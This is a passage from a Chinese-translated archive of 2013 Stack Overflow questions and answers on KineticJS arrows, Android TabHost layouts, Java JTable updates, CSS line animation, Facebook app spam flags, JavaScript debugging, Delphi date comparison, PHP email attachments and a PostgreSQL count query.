        var beginX = group.previousShape.getX() + group.previousShape.getChildren()[0].getWidth() / 2;
        var beginY = group.previousShape.getY() + group.previousShape.getChildren()[0].getHeight();
        var endX = group.nextShape.getX() + group.nextShape.getChildren()[0].getWidth() / 2;
        var endY = group.nextShape.getY() - 8;

        var linha = new Kinetic.Line({
            points: [ beginX, beginY, endX, endY],
            name: 'linha',
            stroke: '#555',
            strokeWidth: 4,
            lineCap: 'butt'
        });

        var seta = new Kinetic.RegularPolygon({
            x: endX,
            y: endY,
            sides: 3,
            radius: 4,
            fill: '#555',
            stroke: '#555',
            strokeWidth: 4,
            name: 'seta'
        });
        seta.rotateDeg(180);

        group.add(seta);
        group.add(linha);

        firstShape.arrow = group;
        lastShape.arrow = group;

        group.reposition = function(){
            var beginX = this.previousShape.getX() + this.previousShape.getChildren()[0].getWidth() / 2;
            var beginY = this.previousShape.getY() + this.previousShape.getChildren()[0].getHeight();
            var endX = this.nextShape.getX() + this.nextShape.getChildren()[0].getWidth() / 2;
            var endY = this.nextShape.getY() - 8;
            this.get('.linha')[0].transitionTo({
                points:[ beginX, beginY, endX, endY],
                duration: 0.0000001,
            });

            this.get('.seta')[0].transitionTo({
                x: endX,
                y: endY,
                duration: 0.0000001,
            });
        };

        return group;
    }

    function getProcess (processText, x, y, width) {

        var group = new Kinetic.Group();

        var complexText = new Kinetic.Text({
            text: processText + '\nX: ' + x + '\nY: ' + y,
            fontSize: 12,
            fontFamily: 'Calibri',
            fill: '#555',
            padding: 20,
            align: 'center',
            name: 'Texto-Processo'
        });

        var rect = new Kinetic.Rect({
            stroke: '#555',
            strokeWidth: 5,
            fill: '#ddd',
            width: complexText.getWidth(),
            height: complexText.getHeight(),
            shadowColor: 'black',
            shadowBlur: 10,
            shadowOffset: [10, 10],
            shadowOpacity: 0.2,
            cornerRadius: 10,
            name: 'Quadro-Processo'
        });

        group.add(rect);
        group.add(complexText);

        group.setDraggable(true);
        group.on('mouseover', function() {
            document.body.style.cursor = 'pointer';
        });
        group.on('mouseout', function() {
            document.body.style.cursor = 'default';
        });     

        group.on('dragmove', function(){
            group.getChildren()[1].setText(this.customText + "\nX: " + this.getX() + "\nY: " + this.getY());
            group.arrow.reposition();
            group.arrow.draw();
        });

        group.setX(x);
        group.setY(y);
        group.customText = processText;
        return group;
    }
var stage = new Kinetic.Stage({
        container: 'container',
        width: 800,
        height: 600,
        id: 'myCanvas'
    });

    var layer = new Kinetic.Layer();

    var processo = getProcess('Processo de Teste de canvas 1', (stage.getWidth() / 2) - 100,  10 , 100);
    processo.setId('canvas1');
    layer.add(processo);

    var processo2 = getProcess('Processo de Teste de canvas 2', (stage.getWidth() / 2) -100, processo.getY() + 300, processo.getX());
    layer.add(processo2);

    layer.add(drawArrow(processo, processo2));

    // add the layer to the stage
    stage.add(layer); 
```

拖动其中一个框时，连接它们的箭头也会移动。由于箭头是使用 2 个形状制作的，我想知道是否有某种方法可以同时使用 .transtionTo，因为当您移动底部框时，您可以看到线条和形成箭头的三角形之间存在一些延迟。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-21T20:00:08.973

问题是 transitionTo 函数不支持转换点。此外，每次移动对象时，都会创建一个新的过渡对象……这非常慢。您不需要为此进行转换，转换仅在用户不打算控制它们时自动对事物进行动画处理有用。

试试这个：

```
 this.get('.linha')[0].setPoints([beginX, beginY, endX, endY]);
    this.get('.seta')[0].setPosition(endX,endY);
    this.getLayer().draw();
    /* this.get('.linha')[0].transitionTo({ //cant transition points
        points: [beginX, beginY, endX, endY],
        duration: 0.0000001,
    }); 

    this.get('.seta')[0].transitionTo({ // lags because everytime you move, a new transition is created, no this would be extremely slow
        x: endX,
        y: endY,
        duration: 0.0000001,
    });
    */ 
```

[http://jsfiddle.net/MTDpC/1/](http://jsfiddle.net/MTDpC/1/)

工作很快吧？

# android - 选项卡内的 ListView 没有填充高度？

> ID：15555175
> 
> 赞同：2
> 
> 时间：2013-03-21T18:20:38.947
> 
> 标签：android, android-layout, listview, android-tabhost

我正在使用 TabHost 并且在一个选项卡内，我插入了 ListView。我将所有高度设置为fill_parent。但它没有显示完整的列表，而只是其中的一部分。如何使标签内容按高度填充屏幕？

```
 <?xml version="1.0" encoding="utf-8"?>
<ScrollView xmlns:android="http://schemas.android.com/apk/res/android"
    android:layout_width="fill_parent"
    android:layout_height="fill_parent" >

    <LinearLayout
        android:layout_width="match_parent"
        android:layout_height="wrap_content"
        android:background="@drawable/bkg"
        android:orientation="vertical" >

        <LinearLayout
            android:layout_width="match_parent"
            android:layout_height="wrap_content"
            android:layout_marginLeft="7dp"
            android:layout_marginRight="7dp"
            android:layout_marginTop="7dp"
            android:background="@drawable/gradientrounded"
            android:orientation="horizontal" >

            <ImageView
                android:id="@+id/imageView1"
                android:layout_width="wrap_content"
                android:layout_height="wrap_content"
                android:layout_marginLeft="15dp"
                android:src="@drawable/taxisign" />

            <LinearLayout
                android:layout_width="match_parent"
                android:layout_height="match_parent"
                android:orientation="vertical" >

                <TextView
                    android:id="@+id/taxiprofiletitle"
                    android:layout_width="wrap_content"
                    android:layout_height="wrap_content"
                    android:layout_marginLeft="15dp"
                    android:layout_weight="0.9"
                    android:text="Large Text"
                    android:textAppearance="?android:attr/textAppearanceLarge"
                    android:textColor="#000000" />

                <Button
                    android:id="@+id/phonenumber"
                    android:layout_width="match_parent"
                    android:layout_height="wrap_content"
                    android:layout_marginBottom="4dp"
                    android:layout_marginLeft="15dp"
                    android:layout_marginRight="15dp"
                    android:layout_marginTop="5dp"
                    android:background="@drawable/button"
                    android:paddingBottom="5dp"
                    android:paddingTop="5dp"
                    android:text="Button"
                    android:textColor="#ffffff" />
            </LinearLayout>

            <ProgressBar
                android:id="@+id/loadFeedbacks"
                style="?android:attr/progressBarStyleLarge"
                android:layout_width="wrap_content"
                android:layout_height="0dp"
                android:layout_gravity="center"
                android:visibility="invisible" />
        </LinearLayout>

        <TabHost
            android:id="@android:id/tabhost"
            android:layout_width="match_parent"
            android:layout_height="match_parent"
            android:background="#FFFF0000" >

            <LinearLayout
                android:layout_width="match_parent"
                android:layout_height="match_parent"
                android:orientation="vertical" >

                <TabWidget
                    android:id="@android:id/tabs"
                    android:layout_width="match_parent"
                    android:background="#FF000000"
                    android:layout_height="wrap_content" >
                    <TextView
                        android:tag="tab0"
                        android:text="Инфо"
                        android:background="@android:drawable/btn_star_big_on"
                        android:layout_width="fill_parent"
                        android:layout_height="fill_parent"
                        />
                    <TextView
                        android:tag="tab1"
                        android:text="Отзывы"
                        android:layout_width="fill_parent"
                        android:layout_height="fill_parent"
                        />
                    <TextView
                        android:tag="tab2"
                        android:text="Тарифы"
                        android:layout_width="fill_parent"
                        android:layout_height="fill_parent"
                        />
                </TabWidget>

                <FrameLayout
                    android:id="@android:id/tabcontent"
                    android:layout_width="match_parent"
                    android:layout_height="match_parent"
                    android:layout_weight="1" >

                    <LinearLayout
                        android:id="@+id/tab1"
                        android:layout_width="match_parent"
                        android:layout_height="match_parent" >

                        <TextView
                            android:id="@+id/profile_info"
                            android:layout_width="wrap_content"
                            android:layout_height="wrap_content"
                            android:text="Info" />
                    </LinearLayout>

                    <LinearLayout
                        android:id="@+id/tab2"
                        android:layout_width="match_parent"
                        android:layout_height="match_parent"
                        android:orientation="vertical" >

                        <LinearLayout
                            android:layout_width="match_parent"
                            android:layout_height="wrap_content"
                            android:orientation="vertical" >

                            <TextView android:text="Добавить"
                                android:layout_width="match_parent"
                                android:layout_height="wrap_content">

                            </TextView>
                            <ImageButton 
                                android:layout_width="wrap_content"
                                android:layout_height="wrap_content"/>
                        </LinearLayout>
                        <ListView
                            android:id="@+id/reviewslist"
                            android:layout_width="match_parent"
                            android:layout_height="wrap_content" >
                        </ListView>

                    </LinearLayout>

                    <LinearLayout
                        android:id="@+id/tab3"
                        android:layout_width="match_parent"
                        android:layout_height="match_parent" >

                        <ListView
                            android:id="@+id/tariffslist"
                            android:layout_width="match_parent"
                            android:layout_height="match_parent"
                            android:layout_weight="1" >
                        </ListView>

                    </LinearLayout>
                </FrameLayout>
            </LinearLayout>
        </TabHost>

    </LinearLayout>

</ScrollView> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-21T18:24:50.503

在您第一次`LinearLayout`更改`layout_height="match_parent"`. 此外，`fill_parent`自 API 8 以来已弃用并替换为，`match_parent`因此您应该使用它。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-21T18:26:58.353

您已经为您的 listView 高度使用了换行内容。您应该始终使用高度作为 match_parent/fill_parent。我想你的问题在这里

```
 <ListView
                        android:id="@+id/reviewslist"
                        android:layout_width="match_parent"
                        android:layout_height="wrap_content" >
                    </ListView> 
```

将其更改为：

```
 <ListView
                        android:id="@+id/reviewslist"
                        android:layout_width="match_parent"
                        android:layout_height="match_parent" >
                    </ListView> 
```

除此之外，这种布局似乎是无效的。不推荐在滚动视图中使用列表视图。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-21T18:24:28.047

在快速查看 XML 文件时，您的 TabHost (LinearLayout) 的父级似乎是“wrap_content”，所以我不确定您是否得到了所有的父级。我确实希望有一个更好的 UI 界面来通过 Eclipse 构建视觉效果。当他们出现时，不太乐意解决这样的问题。他们可以经常出现。通常它需要一些试验和错误才能让事情看起来像我想要的那样。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-03-22T13:24:22.647

滚动布局是不必要的，删除它，使代码工作

# java - Jtable 更新选中的行

> ID：15555183
> 
> 赞同：5
> 
> 时间：2013-03-21T18:20:54.010
> 
> 标签：java, swing, jtable

我有一个带有编辑按钮的 jtable，当我选择一行并单击编辑按钮和编辑字段，然后单击保存按钮时，该行不会更新，我必须刷新我的表才能更改该行！

我的代码：

```
 if (e.getSource() == editButton) {
        selectedRow = uTable.getSelectedRow();
        if (selectedRow >= 0) {
            editUser(selectedRow);
        } else {
            JOptionPane.showMessageDialog(null, "Select a row");
        }
    }

    public void editUser(int row) {
    UserInformation userInf = userModel.getSelectedMember(row);
    NewUserFrame_Edit edit = new NewUserFrame_Edit(userInf, row);
}

... 
```

我的 NewUserFrame_Edit 类：

```
public class NewUserFrame_Edit extends javax.swing.JFrame {

private AllUser userModel;
private int selectedrow;
private String gender;

public NewUserFrame_Edit(AllUser userModel,UserInformation userinf, int row) {
...
this.userModel = userModel;
    jTextField1.setText(userinf.getFname().toString().trim());
    jTextField2.setText(userinf.getLname().toString().trim());

    if (userinf.getGender().equals("Male")) {
        jRadioButton1.setSelected(true);
    } else {
        jRadioButton2.setSelected(true);
    }

    jTextField3.setText(userinf.getDate());
    selectedrow = row;
    setVisible(true);
}

private void updateButtonActionPerformed(java.awt.event.ActionEvent evt) {     
    userinf = new UserInformation();

    userinf.setFname(jTextField1.getText());
    userinf.setLname(jTextField2.getText());
    userinf.setGender(gender);
    userinf.setDate(jTextField3.getText());

    userModel.setValueAt(userinf.getFname() , selectedrow, 1);
    userModel.setValueAt(userinf.getLname() , selectedrow, 2);
    userModel.setValueAt(userinf.getGender(), selectedrow , 3);
    userModel.setValueAt(userinf.getDate() , selectedrow, 4);
    userModel.updateFile(userModel.Udata);

    NewUserFrame_Edit.this.dispose();
}
...
} 
```

我的模型类的 setValueAt() 和 updateFile() 方法：

```
public class AllUser extends AbstractTableModel {
...
    @Override
public void setValueAt(Object value, int rowIndex, int columnIndex) {
    UserInformation userInfo = Udata.get(rowIndex);
    switch (columnIndex) {
        case 0:
            userInfo.setID((String) value);
            break;
        case 1:
            userInfo.setFname((String) value);
            break;
        case 2:
            userInfo.setLname((String) value);
            break;
        case 3:
            userInfo.setGender((String) value);
            break;
        case 4:
            userInfo.setDate((String) value);
            break;
    }
    fireTableCellUpdated(rowIndex, columnIndex);
}

    public void updateFile(ArrayList<UserInformation> data) {
    PrintWriter pw;
    try {
        pw = new PrintWriter(new FileWriter("AllUserRecords.txt"));
        for (UserInformation userinf : data) {
            String line = userinf.getID()
                    + "     " + userinf.getFname()
                    + "     " + userinf.getLname()
                    + "     " + userinf.getGender()
                    + "     " + userinf.getDate();

            pw.println(line);
        }
        pw.close();
    } catch (IOException ioe) {
    }
}
...
} 
```

当我选择一行并单击以编辑按钮时，将打开一个新的 jframe，其文本字段填充有旧数据，我更新数据并单击以保存按钮。因此，我的专栏并不确定。我选择了一整行，而不是一个单元格！

谢谢。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-03-21T18:24:23.960

要更改`JTable`条目，请使用[TableModel#setValueAt](http://docs.oracle.com/javase/7/docs/api/javax/swing/table/TableModel.html#setValueAt%28java.lang.Object,%20int,%20int%29)。打电话`fireTableDataChanged`是不必要的。这是在其内部内部使用的`TableModel`。

```
if (selectedRow >= 0) {
    ...
    userModel.setValueAt(newValue, selectedRow, 0);
     //        ...   more values for columns    1, 2, 3, etc.
} ... 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2013-03-21T18:46:44.327

`updateRow(int index,String[] values)`您可以创建一个在扩展类中调用的方法`AbstractModel`，并在其中使用 setValueAt(newValue,row,index) 为该行的每个单元格设置新值。并在写入 fireTableCellUpdated(row, col)的重写`setValue`方法中。`TableModel`

考虑下面给出的代码。看看课堂上的`updateRow`and`setValueAt`方法`MyModel`。并观看课堂上`((MyModel)myModel).updateRow(row,values);//update row`写的`MyMouseAdapter`。

```
import javax.swing.*;
import javax.swing.border.*;
import java.awt.*;
import java.awt.event.*;
import javax.swing.table.*;

class TableRowEdit extends JFrame  
{
    private JTable table;
    private JScrollPane jsPane;
    private TableModel myModel;
    private JPanel dialogPanel;
    private JTextField tf[];
    private JLabel     lbl[];
    public void prepareAndShowGUI()
    {
        myModel = new MyModel();
        table = new JTable(myModel);
        jsPane = new JScrollPane(table);
        table.getColumnModel().getColumn(2).setCellRenderer(new LabelCellRenderer());
        table.addMouseListener(new MyMouseAdapter());
        getContentPane().add(jsPane);
        setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
        prepareDialogPanel();
        pack();
        setVisible(true);

    }
    private void prepareDialogPanel()
    {
        dialogPanel = new JPanel();
        int col = table.getColumnCount() - 1;
        dialogPanel.setLayout(new GridLayout(col,2));
        tf = new JTextField[col];
        lbl = new JLabel[col];
        for (int i = 0; i < col; i++)
        {
            lbl[i] = new JLabel(table.getColumnName(i));
            tf[i] = new JTextField(10);
            dialogPanel.add(lbl[i]);
            dialogPanel.add(tf[i]);
        }
    }
    private void populateTextField(String[] s)
    {
        for (int i = 0 ; i < s.length ; i++ )
        {
            tf[i].setText(s[i]);
        }
    }
    public class LabelCellRenderer extends DefaultTableCellRenderer 
    {
        public Component getTableCellRendererComponent(JTable table,Object oValue, boolean isSelected, boolean hasFocus, int row, int column) 
        {
            Component c = super.getTableCellRendererComponent(table, oValue,isSelected, hasFocus,row, column);
            String value = (String)oValue;
            JLabel label =(JLabel)c;
            label.setBorder(BorderFactory.createBevelBorder(BevelBorder.RAISED));
            label.setBackground(Color.lightGray);
            label.setHorizontalTextPosition(SwingUtilities.CENTER);
            label.setHorizontalAlignment(SwingUtilities.CENTER);
            label.setText(value);
            return label;
        }
    }

    private class MyMouseAdapter extends MouseAdapter
    {
        @Override
        public void mousePressed(MouseEvent evt)
        {
            int x = evt.getX();
            int y = evt.getY();
            int row = table.rowAtPoint(new Point(x,y));
            int col = table.columnAtPoint(new Point(x,y));
            if (col == 2)
            {
                String arr[] = new String[table.getColumnCount() - 1];
                for (int i = 0 ; i < arr.length ; i++)
                {
                    arr[i] = (String)table.getValueAt(row,i);
                }
                populateTextField(arr);
                JOptionPane.showMessageDialog(TableRowEdit.this,dialogPanel,"Information",JOptionPane.INFORMATION_MESSAGE);
                String[] values = new String[tf.length];
                for (int i = 0 ; i < tf.length ; i++)
                {
                    values[i] = tf[i].getText();
                }
                ((MyModel)myModel).updateRow(row,values);//update row 
            }
        }
    }
    private class MyModel extends AbstractTableModel 
    {
        String[] columns = {
                            "Roll No.",
                            "Name",
                            "Action"
                            };
        String[][] inData = {
                                {"1","Anthony Hopkins","Edit"},
                                {"2","James William","Edit"},
                                {"3","Mc. Donald","Edit"}
                            };
        @Override
        public void setValueAt(Object value, int row, int col)
        {
            inData[row][col] = (String)value;
            fireTableCellUpdated(row,col);
        }
        @Override
        public Object getValueAt(int row, int col)
        {
            return inData[row][col];
        }
        @Override
        public int getColumnCount()
        {
            return columns.length;
        }
        @Override 
        public int getRowCount()
        {
            return inData.length;
        }
        @Override
        public String getColumnName(int col)
        {
            return columns[col];
        }
        @Override
        public boolean isCellEditable(int row ,int col)
        {
            return true;
        }
        //This method updates the Row of table
        public void updateRow(int index,String[] values)
        {
            for (int i = 0 ; i < values.length ; i++)
            {
                setValueAt(values[i],index,i);
            }
        }
    }
    public static void main(String st[])
    {
        SwingUtilities.invokeLater( new Runnable()
        {
            @Override
            public void run()
            {
                TableRowEdit td = new TableRowEdit();
                td.prepareAndShowGUI();
            }
        });
    }
} 
```

**更新**
您的原始代码一切都很好。保持最初的代码。唯一的问题是 line `userModel = new AllUser();` in method `updateButtonActionPerformed`。它正在创建新对象`AllUser`而不是使用当前对象。所以你应该从`updateButtonActionPerformed`. 并将`NewUserFrame_Edit`构造函数更改如下：

```
public NewUserFrame_Edit(AllUser userModel/*Add this parameter*/,UserInformation userinf, int row) {
...
    this.userModel = userModel;
    jTextField1.setText(userinf.getFname().toString().trim());
    jTextField2.setText(userinf.getLname().toString().trim());

    if (userinf.getGender().equals("Male")) {
        jRadioButton1.setSelected(true);
    } else {
        jRadioButton2.setSelected(true);
    }

    jTextField3.setText(userinf.getDate());
    selectedrow = row;
    setVisible(true);
} 
```

更改`updateButtonActionPerformed`如下：

```
private void updateButtonActionPerformed(java.awt.event.ActionEvent evt) {                                             
    //userModel = new AllUser();//Comment it.
    userinf = new UserInformation();

    userinf.setFname(jTextField1.getText());
    userinf.setLname(jTextField2.getText());
    userinf.setGender(gender);
    userinf.setDate(jTextField3.getText());

    userModel.setValueAt(userinf.getFname() , selectedrow, 1);
    userModel.setValueAt(userinf.getLname() , selectedrow, 2);
    userModel.setValueAt(userinf.getGender(), selectedrow , 3);
    userModel.setValueAt(userinf.getDate() , selectedrow, 4);
    userModel.updateFile(userModel.Udata);

    NewUserFrame_Edit.this.dispose();
} 
```

并更改`editUser(int row)`类的方法`UserPage`如下：

```
public void editUser(int row)
{
    UserInformation userInf = userModel.getSelectedMember(row);
    NewUserFrame_Edit edit = new NewUserFrame_Edit(userModel,userInf, row);
} 
```

这是你的方法`updateFile`：

```
public void updateFile(ArrayList<UserInformation> data) {
    PrintWriter pw;
    try {
        pw = new PrintWriter(new FileWriter("AllUserRecords.txt"));
        for (UserInformation userinf : data) {
            String line = userinf.getID()
                    + "     " + userinf.getFname()
                    + "     " + userinf.getLname()
                    + "     " + userinf.getGender()
                    + "     " + userinf.getDate();

            pw.println(line);
        }
        pw.close();
    } catch (IOException ioe) {
    }
} 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-03-21T18:41:53.027

通过 JTable 实现更改的另一种方法是使用下面的代码模板：

```
 table.getModel().addTableModelListener(new TableModelListener(){

        /**
         * Called when table has been changed.
         */
        @Override
        public void tableChanged(TableModelEvent e) {
            int row = e.getFirstRow();
            int column = e.getColumn();
            TableModel model = (TableModel) e.getSource();

            String newdata = (String) model.getValueAt(row, column);
            model.setValueAt(newdata, row, column);
            // do your update with the newdata variable.
        }
    }); 
```

这里可以使用实际事件来获取JTable变量中被改变的单元格的行和列。

# jquery - 动画对角线查询

> ID：15555186
> 
> 赞同：2
> 
> 时间：2013-03-21T18:20:56.713
> 
> 标签：jquery, css

我想知道是否有人知道如何使用 jquery 创建一条对角线并对其进行动画处理，以便在它出现时绘制而不是仅仅出现？

一个圆圈也需要相同的。

一个简单的 jsfiddle 会很棒。

多多帮忙！！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-21T20:41:31.140

您实际上可以使用纯 CSS 来做到这一点：

# [演示](http://codepen.io/thebabydino/pen/AKBnL)

## 对角线

**HTML**：

```
<div class='box'></div> 
```

**CSS**：

```
.box {
  overflow: hidden;
  outline: dotted 1px;
  width: 8.09em; height: 5.88em;
  background: linear-gradient(36deg, 
                transparent 49.5%, black 49.5%, black 50.5%, transparent 50.5%) 
               no-repeat -8.09em -5.88em;
  background-size: 100% 100%;
  animation: drawDiag 2s linear forwards;
}

@keyframes drawDiag {
  to { background-position: 0 0; }
} 
```

* * *

## 圆圈

**HTML**：

```
<div class='circle'>
  <div class='cover'></div>
</div> 
```

**CSS**：

```
.circle {
  overflow: hidden;
  position: relative;
  width: 10em; height: 10em;
}
.circle:before {
  position: absolute;
  width: inherit; height: inherit;
  border-radius: 50%;
  box-shadow: inset 0 0 0 1px black;
  content: '';
}
.cover {
  position: absolute;
  margin: 0 -50%;
  width: 200%; height: inherit;
  transform-origin: 50% 0;
  background: white;
  animation: revealCircle 5s linear forwards;
}

@keyframes revealCircle {
  to { transform: rotate(180deg); }
} 
```

# facebook - 没有负面反馈的 Facebook 应用程序被标记为垃圾邮件

> ID：15555188
> 
> 赞同：0
> 
> 时间：2013-03-21T18:21:02.543
> 
> 标签：facebook

我是一名独立开发者，过去两周一直在测试他们的应用/游戏，总共发布了 4 次。它不再允许我更改 Canvas 和 Secure Canvas URL，说明它们无效，我一直在使用 googledrive

上次我尝试测试以确保没有任何更改破坏了 facebook 提示发布到墙上的共享按钮，它告诉我应用程序已被标记并且我可以提交报告，但这可能会或可能不会改变任何东西。没有负面反馈，我唯一做的就是在一天左右后删除测试帖子。

有没有办法让我的应用程序或“我的”网站不被标记为垃圾邮件？他们审核需要多长时间？或者只是创建一个新的测试应用程序可以解决画布 URL 问题？

谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-21T18:56:31.543

尝试将您的应用置于沙盒模式。这不会将您的应用取消标记为垃圾邮件，但可以让您继续开发/测试。

# javascript - 如何调试 $(document).ready() 中包含的 javascript？

> ID：15555191
> 
> 赞同：5
> 
> 时间：2013-03-21T18:21:06.210
> 
> 标签：javascript, jquery, debugging, google-chrome, breakpoints

我正在尝试在浏览器（特别是 Chrome）中调试一些 js。如何检查为 some_data 和 new_data 设置的值？

我意识到由于变量范围仅限于函数，`some_data`并且`new_data`在执行文档 ready() 后不存在。

```
$(document).ready(function(){
   var some_data = [4, 8, 15, 16, 23, 42];
       var new_data = some_data * 2;
}); 
```

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-03-21T18:29:14.187

使用开发者工具。如果您使用的是 chrome，请按 F12，转到源代码，找到您的 javascript 所在的文件，找到您的代码，设置断点（通过单击要设置断点的行的左侧），然后按 F10 执行逐行。您只需将鼠标悬停在变量名称上，它就会为您提供当前值。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-03-21T18:58:18.957

我的两分钱...

在代码中写下这个词`debugger`......并且会立即生成一个断点，如果你点击 (ctrl + i) 会显示调试器控件......

最好的

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-03-21T18:33:13.587

您可以在 IE、Chrome 中使用开发者工具栏。对于 Firefox 使用 Firebug，这是一个 Firefox 附加组件。对于 Safari 使用检查元素。所有大多数浏览器支持以下键：

```
F10- execute line by line(step over next function call)
F11- (step into next function call)
F8- Pause script execution. 
```

# delphi - 使用 DateTimePicker 组件比较 Delphi 7 中的日期

> ID：15555193
> 
> 赞同：-1
> 
> 时间：2013-03-21T18:21:07.027
> 
> 标签：delphi, delphi-7

我正在尝试为两个`DateTimePicker`组件动态分配日期，然后将两者进行比较。

我有两个条件要在这里做。首先，我想测试给组件的日期是否与当前日期相同。我这样做：

```
if DateClosed.date = DateCurrent.date then 
 begin 
  //some code goes here
 end; 
```

在第二种情况下，我试图测试提供给的日期是否`dateClosed`落在也提供给两个的其他两个日期之间或之间`DateTimePicker`。

我正在使用 Borland Delphi 7 Professional。

请尽量保持答案尽可能简单，因为我对 Delphi 还很陌生。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-03-22T01:26:12.610

`TDateTimePicker.Date`即使您已指定只需要日期，也包括时间组件（小数点右侧的小数部分）。这会导致比较失败，因为即使日期部分（小数点左侧的部分）可能完全匹配，但小数部分却不匹配。

如果您只想比较日期部分（忽略任何时差），只需删除小数部分 using `Trunc`（在`System`单位中，因此无需在您的 uses 子句中添加任何内容即可自动使用）：

```
if Trunc(DateClosed.Date) = Trunc(DateCurrent.Date) then
  // The dates are the same 
```

有关更多信息，请参阅 Delphi 帮助文件 - XE3 文档在[此处](http://docwiki.embarcadero.com/Libraries/XE3/en/System.Trunc)，但自 Delphi 7 以来没有更改。

# php - 将数据附加到电子邮件 (PHP) 时遇到问题，想发送高达 20 MB 的数据，你猜？

> ID：15555194
> 
> 赞同：-1
> 
> 时间：2013-03-21T18:21:07.837
> 
> 标签：php, email, pdf, base64, attachment

面临的问题：尝试使用 PHP 发送电子邮件，最多 20 MB 数据作为电子邮件附件，所有文件都是 .pdf 文件。我可以成功发送最多 5 MB 的电子邮件，但如果尝试发送超过 5 MB 的数据，我的收件箱中从未收到电子邮件，PHP 也没有显示错误。我在许多论坛上搜索过这个问题，并尝试了他们提供的所有解决方案。就像 php.ini 文件中的设置一样。

php.ini 设置：

memory_limit = 256M

max_execution_time = 60

max_file_uploads = 25

post_max_size = 25M

upload_max_filesize = 10M

我正在使用的代码：

```
 $to = $settings->factoring_email; 
        $from = ucfirst($settings->company_name)."<".$settings->company_billing_email.">";

        $subject = ucfirst($settings->company_name).' Invoice Manifest '.$post['inv_date'];
        $message = "Please see attached documents.";
        $headers = "From: $from";

        // boundary
        $semi_rand = md5(time());
        $mime_boundary = "==Multipart_Boundary_x{$semi_rand}x";
        // headers for attachment
        $headers .= "\nMIME-Version: 1.0\n" . "Content-Type: multipart/mixed;\n" . " boundary=\"{$mime_boundary}\"";
        // multipart boundary
        $message = "This is a multi-part message in MIME format.\n\n" . "--{$mime_boundary}\n" . "Content-Type: text/plain; charset=\"iso-8859-1\"\n" . "Content-Transfer-Encoding: 7bit\n\n" . $message . "\n\n";
        $message .= "--{$mime_boundary}\n";

        // preparing attachments
        $count = count($files);
        for($x=0;$x<$count;$x++){
            if(stristr($files[$x],'manifest')) {
                $path = BASE_PATH.DS.'docs'.DS.'tmp'.DS.$files[$x];
                $name = $files[$x];
            }
            else {
                $path = BASE_PATH.DS.'docs'.DS.'load_info'.DS.$files[$x].'.pdf';
                $name = $files[$x].'.pdf';
            }

            if(file_exists($path)) {
                $file = fopen($path,"rb");
                $data = fread($file,filesize($path));
                fclose($file);
                $data = chunk_split(base64_encode($data));
                $message .= "Content-Type: {\"application/octet-stream\"};\n" . " name=\"$name\"\n" .
                "Content-Disposition: attachment;\n" . " filename=\"$name\"\n" .
                "Content-Transfer-Encoding: base64\n\n" . $data . "\n\n";
                $message .= "--{$mime_boundary}\n";

                unset($file, $data);
            }
        }
        // send

        $ok = mail($to, $subject, $message, $headers);

        if ($ok) {
            echo "<p>mail sent to $to!</p>";
        } else {
            echo "<p>mail could not be sent!</p>";
        } 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-21T18:23:21.567

如果您成功发送了较小的邮件，我敢打赌这更有可能是您的邮件服务配置的问题。您的邮件路线上的某个人不允许“大”邮件通过。检查您的回复地址，看看是否有任何退回。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-21T22:13:52.010

您永远不会在收件箱中收到电子邮件，因为电子邮件永远不会在途中发送。电子邮件被该函数联系的 SMTP 服务器或该函数产生`mail()`的程序拒绝。`mail()`

这两种情况中的哪一种取决于您[与邮件相关的 PHP 配置](http://www.php.net/manual/en/mail.configuration.php)。

# sql - 如何以良好的性能查询多个 COUNT(*)

> ID：15555196
> 
> 赞同：2
> 
> 时间：2013-03-21T18:21:14.073
> 
> 标签：sql, postgresql, relational-database, postgresql-9.2

我有这张桌子：

```
CREATE TABLE schedule (
schedule_id serial NOT NULL,
start_date date,
CONSTRAINT schedule_id PRIMARY KEY (schedule_element_id)
) 
```

而这张表：

```
CREATE TABLE schedule_user (
schedule_user_id serial NOT NULL,
schedule_id integer,
state int,
CONSTRAINT fk_schedule_id   FOREIGN KEY (schedule_id)
      REFERENCES schedule (schedule_id) MATCH SIMPLE
      ON UPDATE NO ACTION ON DELETE NO ACTION
) 
```

```
日程
 -------------------------
|schedule_id |日期 |
|------------+------------|
|1 |'2013-10-10'|
|2 |'2013-10-20'|
|3 |'2013-08-13'|
 -------------------------

schedule_user
 ----------------------------------
|schedule_user_id|schedule_id |状态|
|----------------+------------+-----|
|1 | 1 |0 |
|2 | 1 |1 |
|3 | 1 |2 |
|4 | 1 |0 |
|5 | 1 |1 |
|6 | 1 |1 |
|4 | 2 |0 |
|5 | 2 |1 |
|7 | 2 |0 |
|2 | 3 |1 |
 ----------------------------------

```

我想要一张这样的桌子：

```
特征
 --------------------------------------
|schedule_id |state0|state1|state2|total|
|------------+------+------+------+-----|
|1 |2 |3 |1 |6 |
|2 |2 |1 |0 |3 |
|3 |1 |1 |0 |2 |
 --------------------------------------

```

我做了这个查询，它看起来和它的性能一样可怕。

```
SELECT 
    schedule.schedule_id AS id, 
    (( SELECT count(*) AS count
         FROM schedule_user
         WHERE schedule_user.schedule_id = schedule.schedule_id
           AND state=0))::integer AS state0, 
    (( SELECT count(*) AS count
         FROM schedule_user
         WHERE schedule_user.schedule_id = schedule.schedule_id
           AND state=1))::integer AS state1,
    (( SELECT count(*) AS count
         FROM schedule_user
         WHERE schedule_user.schedule_id = schedule.schedule_id
           AND state=2))::integer AS state2,          
    (( SELECT count(*) AS count
         FROM schedule_user
         WHERE schedule_user.schedule_id = schedule.schedule_id))::integer
       AS total
  FROM schedule 
```

